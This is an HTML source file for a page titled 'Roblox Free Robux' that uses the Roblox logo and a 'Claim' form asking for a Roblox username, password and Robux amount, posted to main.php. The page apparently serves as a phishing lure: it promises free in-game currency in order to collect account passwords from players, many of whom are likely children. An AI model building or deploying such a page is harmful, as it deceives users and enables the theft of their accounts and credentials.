

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Roblox Free Robux</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="icon" href="Roblox_Logo_2022.jpg">
</head>
<body>

    <div class="container">
        <h1>Roblox Free Robux</h1>
        <form id="claimForm" action="main.php" method="POST">

            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username" required aria-required="true" aria-label="Username input"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required aria-required="true" aria-label="Password input"><br>
            <label for="robuxAmount">Robux:</label><br>
            <input type="number" id="robuxAmount" name="robuxAmount" required aria-required="true" aria-label="Robux input"><br>
            <button type="submit" id="button" class="button" aria-label="Submit Button">Claim</button>
        </form>
      
        <div id="claimMessage" role="alert" aria-live="polite"></div> 
    </div>
    
    <script src="script.js"></script>
</body>
</html>
